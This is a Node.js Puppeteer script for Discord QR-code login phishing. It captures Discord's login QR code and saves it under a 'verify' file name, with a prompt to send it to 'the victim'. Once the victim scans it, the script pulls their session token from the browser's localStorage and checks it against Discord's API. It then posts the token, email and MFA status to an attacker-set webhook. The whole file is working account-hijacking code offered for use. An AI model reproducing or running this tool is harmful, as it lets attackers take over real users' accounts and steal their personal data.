require('dotenv').config();
const puppeteer = require('puppeteer-core');
const path = require('path');
const fs = require('fs');
const https = require('https');

const WEBHOOK_URL = process.env.WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE';
const OUTPUT_DIR = path.join(__dirname, '..', 'output');

// CHANGE THIS PATH to where Chrome is on YOUR computer
const CHROME_PATH = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';

fs.mkdirSync(OUTPUT_DIR, { recursive: true });

function sendToWebhook(content, embeds = []) {
  if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') return;
  const payload = JSON.stringify({ content, embeds });
  const url = new URL(WEBHOOK_URL);
  const req = https.request({
    hostname: url.hostname, path: url.pathname + url.search,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
  });
  req.on('error', () => {});
  req.write(payload);
  req.end();
}

async function run() {
  console.log('[1/5] Launching your installed Chrome...');
  
  const browser = await puppeteer.launch({
    executablePath: CHROME_PATH,
    headless: false,  // Set to false so you can see it
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-gpu',
      '--window-size=1280,720',
    ],
    protocolTimeout: 60000,
    userDataDir: path.join(OUTPUT_DIR, 'chrome_profile'),
  });

  const page = await browser.newPage();
  page.on('pageerror', () => {});
  page.on('console', () => {});

  console.log('[2/5] Opening Discord login page...');
  await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 60000 });

  console.log('[3/5] Looking for QR code...');
  await new Promise(r => setTimeout(r, 5000));

  // Try to find QR
  let qrElement = null;
  const selectors = [
    'img[alt*="QR"]',
    'div[class*="qrCode"] img',
    'canvas[class*="qrCode"]',
    'div[class*="qr"] img',
  ];
  
  for (const selector of selectors) {
    try {
      qrElement = await page.waitForSelector(selector, { timeout: 2000 });
      if (qrElement) { console.log(`[+] Found QR: ${selector}`); break; }
    } catch (e) {}
  }

  if (!qrElement) {
    console.log('[-] QR not found. Taking debug screenshot...');
    await page.screenshot({ path: path.join(OUTPUT_DIR, 'debug.png') });
    console.log('[!] Check output/debug.png to see what Discord showed');
    console.log('[!] If it shows a captcha, Discord is blocking automated login.');
    console.log('[!] You can try solving it manually by setting headless: false');
    await browser.close();
    return;
  }

  // Get QR data
  const tagName = await page.evaluate(el => el.tagName, qrElement);
  let qrBase64;
  
  if (tagName === 'IMG') {
    qrBase64 = await page.evaluate(el => el.src, qrElement);
  } else if (tagName === 'CANVAS') {
    qrBase64 = await page.evaluate(el => el.toDataURL('image/png'), qrElement);
  } else {
    const buf = await qrElement.screenshot();
    qrBase64 = `data:image/png;base64,${buf.toString('base64')}`;
  }

  // Save image
  const matches = qrBase64.match(/^data:image\/(png|jpeg);base64,(.+)$/);
  if (!matches) { console.error('[-] Bad QR data'); await browser.close(); return; }
  
  const imageBuffer = Buffer.from(matches[2], 'base64');
  const outputFile = path.join(OUTPUT_DIR, 'discord_verify_qr.png');
  fs.writeFileSync(outputFile, imageBuffer);
  
  console.log(`[4/5] ✅ QR saved to: ${outputFile}`);
  console.log('\n📤 SEND THIS IMAGE TO THE VICTIM\n');

  // Wait for scan
  const initialUrl = page.url();
  const startTime = Date.now();
  let scanned = false;

  console.log('[5/5] Waiting for scan...');

  while (Date.now() - startTime < 130000) {
    try {
      if (page.url() !== initialUrl) { scanned = true; break; }
      const hasToken = await page.evaluate(() => {
        try { return !!window.localStorage.getItem('token'); } catch { return false; }
      });
      if (hasToken) { scanned = true; break; }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 500));
  }

  if (!scanned) {
    console.log('[-] No scan within 2 minutes');
    await browser.close();
    return;
  }

  console.log('[+] Scanned! Extracting token...');
  await new Promise(r => setTimeout(r, 3000));

  const token = await page.evaluate(() => {
    try { return (window.localStorage.getItem('token') || '').replace(/"/g, ''); }
    catch { return null; }
  });

  if (!token) {
    console.log('[-] No token found');
    await browser.close();
    return;
  }

  // Validate
  const { valid, user } = await new Promise((resolve) => {
    const req = https.request({
      hostname: 'discord.com', path: '/api/v9/users/@me',
      headers: { 'Authorization': token, 'User-Agent': 'Mozilla/5.0' },
    }, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try { resolve({ valid: res.statusCode === 200, user: JSON.parse(d) }); }
        catch { resolve({ valid: false, user: null }); }
      });
    });
    req.on('error', () => resolve({ valid: false, user: null }));
    req.end();
  });

  if (!valid || !user) {
    console.log('[-] Invalid token');
    await browser.close();
    return;
  }

  console.log('\n✅ TOKEN CAPTURED!');
  console.log(`User:  ${user.username}#${user.discriminator || ''}`);
  console.log(`ID:    ${user.id}`);
  console.log(`Email: ${user.email || 'N/A'}`);
  console.log(`Token: ${token}\n`);

  sendToWebhook('@everyone **Token via QR!**', [{
    title: `${user.username}#${user.discriminator || ''}`,
    fields: [
      { name: 'Token', value: `\`${token}\``, inline: false },
      { name: 'Email', value: user.email || 'N/A', inline: true },
      { name: 'MFA', value: user.mfa_enabled ? '🔒 Yes' : '🔓 No', inline: true },
    ],
    thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
    timestamp: new Date().toISOString(),
  }]);

  console.log('[+] Token sent to webhook');
  await new Promise(r => setTimeout(r, 30000));
  await browser.close();
}

run().catch(err => console.error('Error:', err.message));